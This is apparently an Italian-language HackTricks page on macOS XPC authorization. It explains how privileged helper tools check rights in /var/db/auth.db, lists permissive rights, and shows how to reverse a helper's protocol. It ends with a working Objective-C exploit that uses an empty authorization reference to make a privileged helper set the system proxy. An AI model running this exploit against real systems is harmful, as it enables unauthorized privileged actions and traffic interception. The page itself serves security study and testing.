# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple propone anche un altro modo per autenticare se il processo di connessione ha **permessi per chiamare un metodo XPC esposto**.

Quando un'applicazione ha bisogno di **eseguire azioni come un utente privilegiato**, invece di eseguire l'app come un utente privilegiato, di solito installa come root un HelperTool come servizio XPC che può essere chiamato dall'app per eseguire quelle azioni. Tuttavia, l'app che chiama il servizio dovrebbe avere abbastanza autorizzazione.

### ShouldAcceptNewConnection sempre YES

Un esempio può essere trovato in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` prova a **connettersi** al **HelperTool**. E in `HelperTool/HelperTool.m` la funzione **`shouldAcceptNewConnection`** **non controllerà** nessuno dei requisiti indicati in precedenza. Restituirà sempre YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Per ulteriori informazioni su come configurare correttamente questo controllo:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Diritti dell'applicazione

Tuttavia, c'è un po' di **autorizzazione in corso quando viene chiamato un metodo dal HelperTool**.

La funzione **`applicationDidFinishLaunching`** di `App/AppDelegate.m` creerà un riferimento di autorizzazione vuoto dopo che l'app è stata avviata. Questo dovrebbe sempre funzionare.\
Poi, cercherà di **aggiungere alcuni diritti** a quel riferimento di autorizzazione chiamando `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La funzione `setupAuthorizationRights` di `Common/Common.m` memorizzerà nel database di autorizzazione `/var/db/auth.db` i diritti dell'applicazione. Nota come aggiungerà solo i diritti che non sono ancora nel database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La funzione `enumerateRightsUsingBlock` è quella utilizzata per ottenere i permessi delle applicazioni, che sono definiti in `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Questo significa che alla fine di questo processo, i permessi dichiarati all'interno di `commandInfo` saranno memorizzati in `/var/db/auth.db`. Nota come lì puoi trovare per **ogni metodo** che richiederà **autenticazione**, **nome del permesso** e il **`kCommandKeyAuthRightDefault`**. Quest'ultimo **indica chi può ottenere questo diritto**.

Ci sono diversi ambiti per indicare chi può accedere a un diritto. Alcuni di essi sono definiti in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (puoi trovare [tutti qui](https://www.dssw.co.uk/reference/authorization-rights/)), ma in sintesi:

<table><thead><tr><th width="284.3333333333333">Nome</th><th width="165">Valore</th><th>Descrizione</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Chiunque</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nessuno</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>L'utente attuale deve essere un admin (all'interno del gruppo admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Chiedi all'utente di autenticarsi.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Chiedi all'utente di autenticarsi. Deve essere un admin (all'interno del gruppo admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specifica le regole</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specifica alcuni commenti extra sul diritto</td></tr></tbody></table>

### Verifica dei Diritti

In `HelperTool/HelperTool.m` la funzione **`readLicenseKeyAuthorization`** controlla se il chiamante è autorizzato a **eseguire tale metodo** chiamando la funzione **`checkAuthorization`**. Questa funzione verificherà che i **authData** inviati dal processo chiamante abbiano un **formato corretto** e poi controllerà **cosa è necessario per ottenere il diritto** di chiamare il metodo specifico. Se tutto va bene, l'**errore restituito sarà `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Nota che per **controllare i requisiti per ottenere il diritto** di chiamare quel metodo, la funzione `authorizationRightForCommand` controllerà solo l'oggetto commentato in precedenza **`commandInfo`**. Poi, chiamerà **`AuthorizationCopyRights`** per verificare **se ha i diritti** di chiamare la funzione (nota che i flag consentono l'interazione con l'utente).

In questo caso, per chiamare la funzione `readLicenseKeyAuthorization`, il `kCommandKeyAuthRightDefault` è definito come `@kAuthorizationRuleClassAllow`. Quindi **chiunque può chiamarlo**.

### Informazioni sul DB

È stato menzionato che queste informazioni sono memorizzate in `/var/db/auth.db`. Puoi elencare tutte le regole memorizzate con:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Poi, puoi leggere chi può accedere al diritto con:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Diritti permissivi

Puoi trovare **tutte le configurazioni dei permessi** [**qui**](https://www.dssw.co.uk/reference/authorization-rights/), ma le combinazioni che non richiederanno interazione da parte dell'utente sarebbero:

1. **'authenticate-user': 'false'**
- Questa è la chiave più diretta. Se impostata su `false`, specifica che un utente non ha bisogno di fornire autenticazione per ottenere questo diritto.
- Questo è usato in **combinazione con una delle 2 sotto o indicando un gruppo** a cui l'utente deve appartenere.
2. **'allow-root': 'true'**
- Se un utente opera come utente root (che ha permessi elevati), e questa chiave è impostata su `true`, l'utente root potrebbe potenzialmente ottenere questo diritto senza ulteriore autenticazione. Tuttavia, tipicamente, ottenere lo stato di utente root richiede già autenticazione, quindi questo non è uno scenario di "nessuna autenticazione" per la maggior parte degli utenti.
3. **'session-owner': 'true'**
- Se impostata su `true`, il proprietario della sessione (l'utente attualmente connesso) otterrebbe automaticamente questo diritto. Questo potrebbe bypassare ulteriori autenticazioni se l'utente è già connesso.
4. **'shared': 'true'**
- Questa chiave non concede diritti senza autenticazione. Invece, se impostata su `true`, significa che una volta che il diritto è stato autenticato, può essere condiviso tra più processi senza che ciascuno debba ri-autenticarsi. Ma la concessione iniziale del diritto richiederebbe comunque autenticazione a meno che non sia combinata con altre chiavi come `'authenticate-user': 'false'`.

Puoi [**usare questo script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) per ottenere i diritti interessanti:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Reversing Authorization

### Controllare se EvenBetterAuthorization è utilizzato

Se trovi la funzione: **`[HelperTool checkAuthorization:command:]`** è probabile che il processo stia utilizzando lo schema di autorizzazione precedentemente menzionato:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Se questa funzione chiama funzioni come `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, sta utilizzando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Controlla il **`/var/db/auth.db`** per vedere se è possibile ottenere permessi per chiamare alcune azioni privilegiate senza interazione dell'utente.

### Protocol Communication

Poi, devi trovare lo schema del protocollo per poter stabilire una comunicazione con il servizio XPC.

La funzione **`shouldAcceptNewConnection`** indica il protocollo che viene esportato:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In questo caso, abbiamo lo stesso di EvenBetterAuthorizationSample, [**controlla questa riga**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Sapendo il nome del protocollo utilizzato, è possibile **dumpare la sua definizione dell'intestazione** con:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Infine, dobbiamo solo conoscere il **nome del Mach Service esposto** per stabilire una comunicazione con esso. Ci sono diversi modi per trovarlo:

- Nel **`[HelperTool init]`** dove puoi vedere il Mach Service in uso:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Nel plist di launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Esempio di Exploit

In questo esempio viene creato:

- La definizione del protocollo con le funzioni
- Un'autenticazione vuota da utilizzare per richiedere l'accesso
- Una connessione al servizio XPC
- Una chiamata alla funzione se la connessione è stata effettuata con successo
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Altri helper di privilegio XPC abusati

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Riferimenti

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
